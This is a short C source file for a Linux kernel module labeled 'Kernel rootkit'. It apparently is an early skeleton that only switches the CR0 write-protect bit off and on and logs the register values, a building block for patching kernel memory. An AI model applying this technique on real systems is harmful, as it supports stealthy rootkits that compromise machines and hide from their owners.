#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <asm/unistd.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <asm/paravirt.h>

static inline void write_cr0_forced(unsigned long val)
{
    asm volatile("mov %0,%%cr0": "+r" (val), "+m" (__force_order));
}

static inline void unprotect_memory(void)
{
    write_cr0_forced(read_cr0() & ~X86_CR0_WP);
}

static inline void protect_memory(void)
{
    write_cr0_forced(read_cr0() | X86_CR0_WP);
}

static void test_memory_protection(void)
{
    unsigned long cr0;
    printk(KERN_INFO "Loading Tzel.\n");

    cr0 = read_cr0();
    printk(KERN_INFO "cr0: %lx\n", cr0);

    printk(KERN_INFO "Unprotecting...\n");
    unprotect_memory();

    cr0 = read_cr0();
    printk(KERN_INFO "cr0: %lx\n", cr0);

    printk(KERN_INFO "Protecting...\n");
    protect_memory();

    cr0 = read_cr0();
    printk(KERN_INFO "cr0: %lx\n", cr0);
}

static int __init init_rootkit(void)
{
    test_memory_protection();

    return 0;
}

static void __exit cleanup_rootkit(void)
{
    
}  

module_init(init_rootkit);
module_exit(cleanup_rootkit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Pedro Peck");
MODULE_DESCRIPTION("Kernel rootkit");
